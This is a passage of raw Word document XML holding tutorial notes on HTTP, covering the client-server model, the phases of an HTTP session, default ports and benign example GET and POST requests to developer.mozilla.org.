          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>The server interprets the request received, maps the request into a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>program</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t> kept in the server, executes the program, and returns the output of the program to the client.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="204"/>
        </w:numPr>
        <w:spacing w:before="72" w:after="72" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="600"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>The request cannot be satisfied, the server returns an error message.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:spacing w:before="168" w:beforeAutospacing="0" w:after="72" w:afterAutospacing="0"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI" w:hAnsi="Segoe UI" w:cs="Segoe UI"/>
          <w:color w:val="000000"/>
          <w:sz w:val="21"/>
          <w:szCs w:val="21"/>
        </w:rPr>
        <w:t>An example of the HTTP response message is as shown:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="00095B8F">
      <w:pPr>
        <w:pStyle w:val="HTMLPreformatted"/>
        <w:pBdr>
          <w:top w:val="single" w:sz="12" w:space="2" w:color="F8F8F8"/>
          <w:left w:val="single" w:sz="12" w:space="8" w:color="F8F8F8"/>
          <w:bottom w:val="single" w:sz="12" w:space="2" w:color="F8F8F8"/>
          <w:right w:val="single" w:sz="12" w:space="8" w:color="F8F8F8"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="E2F6FF"/>
        <w:spacing w:line="254" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>HTTP/1.1 200 OK</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00095B8F" w:rsidRDefault="00095B8F" w:rsidP="004C44FA"/>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="004C44FA"/>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F9FA"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
        </w:rPr>
        <w:t>A typical HTTP session</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In client-server protocols, like HTTP, sessions consist of three phases:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="205"/>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client establishes a TCP connection (or the appropriate connection if the transport layer is not TCP).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="205"/>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lastRenderedPageBreak/>
        <w:t>The client sends its request, and waits for the answer.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="205"/>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server processes the request, sending back its answer, providing a status code and appropriate data.</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As of HTTP/1.1, the connection is no longer closed after completing the third phase, and the client is now granted a further request: this means the second and third phases can now be performed any number of times.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="1545" w:beforeAutospacing="0" w:after="300" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Establishing a connection</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In client-server protocols, it is the client which establishes the connection. Opening a connection in HTTP means initiating a connection in the underlying transport layer, usually this is TCP.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>With TCP the default port, for an HTTP server on a computer, is port 80. Other ports can also be used, like 8000 or 8080. The URL of a page to fetch contains both the domain name, and the port number, though the latter can be omitted if it is 80. See </w:t>
      </w:r>
      <w:hyperlink r:id="rId271" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
            <w:color w:val="3F87A6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Identifying resources on the Web</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> for more details.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFF3D4"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Strong"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Note:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t> The client-server model does not allow the server to send data to the client without an explicit request for it. To work around this problem, web developers use several techniques: ping the server periodically via the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://developer.mozilla.org/en-US/docs/Web/API/XMLHTTPRequest" \o "XMLHttpRequest objects to interact with servers. You can retrieve data from a URL without having to do a full page refresh. This enables a Web page to update just part of a page without disrupting what the user is doing." </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="3F87A6"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>XMLHTTPRequest</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId272" w:tooltip="The fetch() method of the GlobalFetch interface starts the process of fetching a resource. This returns a promise that resolves to the Response object representing the response to your request." w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="HTMLCode"/>
            <w:rFonts w:ascii="Consolas" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Consolas" w:cs="Consolas"/>
            <w:color w:val="3F87A6"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>Fetch</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t> APIs, using the HTML </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:instrText xml:space="preserve"> HYPERLINK "https://developer.mozilla.org/en/WebSockets" \o "en/WebSockets" </w:instrText>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="3F87A6"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>WebSockets</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Hyperlink"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="3F87A6"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> API</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>, or similar protocols.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="1545" w:beforeAutospacing="0" w:after="300" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:t>Sending a client request</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 xml:space="preserve">Once the connection is established, the user-agent can send the request (a user-agent is typically a web browser, but can be anything else, a crawler, for example). A client request consists of text directives, separated by CRLF (carriage return, followed by line feed), </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>divided</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t xml:space="preserve"> into three blocks:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="206"/>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first line contains a request method followed by its parameters:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="206"/>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path of the document, i.e. an absolute URL without the protocol or domain name</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="206"/>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lastRenderedPageBreak/>
        <w:t>the HTTP protocol version</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="206"/>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Subsequent lines represent an HTTP header, giving the server information about what type of data is appropriate (e.g., what language, what MIME types), or other data altering its behavior (e.g., not sending an answer if it is already cached). These HTTP headers form a block which ends with an empty line.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="206"/>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final block is an optional data block, which may contain further data mainly used by the POST method.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="highlight-span"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="333333"/>
        </w:rPr>
        <w:t>Example requests</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Fetching the root page of developer.mozilla.org, i.e. </w:t>
      </w:r>
      <w:hyperlink r:id="rId273" w:tooltip="Linkification: http://developer.mozilla.org/" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
            <w:color w:val="3F87A6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>http://developer.mozilla.org/</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>, and telling the server that the user-agent would prefer the page in French, if possible:</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GET / HTTP/1.1</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Host: developer.mozilla.org</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Accept-Language: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>fr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>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Fonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>Observe that final empty line, this separates the data block from the header block. As there is no </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Content-Length provided in an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>HTTP header, this data block is presented empty, marking the end of the headers, allowing the server to process the request the moment it receives this empty line.</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For example, sending the result of a form:</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POST /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>contact_form.php</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP/1.1</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Host: developer.mozilla.org</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Content-Length: 64</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Content-Type: application/x-www-form-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>urlencoded</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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Fonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>name=</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>Joe%20User&amp;request=Send%20me%20one%20of%20your%20catalogue</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rStyle w:val="highlight-span"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="333333"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype" w:cs="Times New Roman"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="highlight-span"/>
          <w:rFonts w:ascii="Palatino Linotype" w:hAnsi="Palatino Linotype"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:color w:val="FFFFFF"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="333333"/>
        </w:rPr>
        <w:t>Request methods</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="0" w:beforeAutospacing="0" w:after="0" w:afterAutospacing="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>HTTP defines a set of </w:t>
      </w:r>
      <w:hyperlink r:id="rId274" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
            <w:color w:val="3F87A6"/>
            <w:sz w:val="27"/>
            <w:szCs w:val="27"/>
            <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          </w:rPr>
          <w:t>request methods</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> indicating the desired action to be performed upon a resource. Although they can also be nouns, these requests methods are sometimes referred as HTTP verbs. The most common requests are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="333333"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0034244E" w:rsidRDefault="0034244E" w:rsidP="0034244E">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="207"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
          <w:color w:val="333333"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Open Sans" w:hAnsi="Open Sans"/>
